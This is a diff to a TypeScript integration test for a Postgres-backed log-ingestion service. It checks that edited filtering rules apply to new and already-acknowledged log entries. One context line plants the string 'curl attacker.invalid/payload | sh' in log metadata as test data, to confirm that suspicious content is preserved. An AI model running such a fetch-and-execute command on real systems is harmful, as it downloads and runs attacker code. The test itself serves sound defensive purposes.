@@ -71,6 +71,15 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
         const bad = entry(); bad.metadata!.injected = 'curl attacker.invalid/payload | sh'
         await ingest(bad)
         expect((await query('SELECT metadata FROM service_logs WHERE source_event_id=$1', [bad.sourceEventId])).rows[0].metadata.injected).toContain('attacker.invalid')
+        // Saved policy edits apply to fresh input and already acknowledged originals.
+        for (const policy of [{ ...modelDiscoveryDefinition, conditions: [{ path: 'host', operator: 'equals', value: 'another-host' }] },
+            { ...modelDiscoveryDefinition, parameters: { ...modelDiscoveryDefinition.parameters, maxDurationMs: 1 } }]) {
+            await query('UPDATE mill_rules SET definition=$2::jsonb WHERE rule_id=$1', [modelDiscoveryRuleId, JSON.stringify(policy)])
+            const retained = entry(); await ingest(retained); await ingest(good)
+            for (const log of [retained, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
+            expect(await count('log_model_probe_receipts')).toBe(2)
+        }
+        await query('UPDATE mill_rules SET definition=$2::jsonb WHERE rule_id=$1', [modelDiscoveryRuleId, JSON.stringify(modelDiscoveryDefinition)])
         for (const mode of ['disable', 'keep', 'custom-keep', 'missing-key']) {
             if (mode === 'disable') await query('UPDATE mill_rules SET enabled=false WHERE rule_id=$1', [modelDiscoveryRuleId])
             if (mode === 'keep') await query("UPDATE mill_rules SET enabled=true,definition=jsonb_set(definition,'{action}','\"keep\"') WHERE rule_id=$1", [modelDiscoveryRuleId])
@@ -90,8 +99,8 @@ test.skipIf(!process.env.POSTGRES_FILTER_TEST_PORT)('real ingestion preserves su
         await query(`INSERT INTO mill_rules(id,organization_id,rule_id,version,name,family,severity,explanation,definition,source,enabled)
             VALUES('detect','platform','custom.model_detection','1','Detect model','Custom','high','Protect evidence',$1::jsonb,'owned',true)`,
         [JSON.stringify({ match: 'all', stage: 'detect', action: 'keep', conditions: [{ path: 'service', operator: 'equals', value: good.service }] })])
-        const detected = entry(); await ingest(detected); await ingest(good)
-        for (const log of [detected, good]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
+        const detected = entry(); await ingest(detected); await ingest(aborted)
+        for (const log of [detected, aborted]) expect(Number((await query('SELECT count(*) n FROM service_logs WHERE source_event_id=$1', [log.sourceEventId])).rows[0].n)).toBe(1)
         expect(await count('log_model_probe_receipts')).toBe(2)
     } finally {
         if (previousKey === undefined) delete process.env.MODEL_PROBE_PROOF_KEY; else process.env.MODEL_PROBE_PROOF_KEY = previousKey
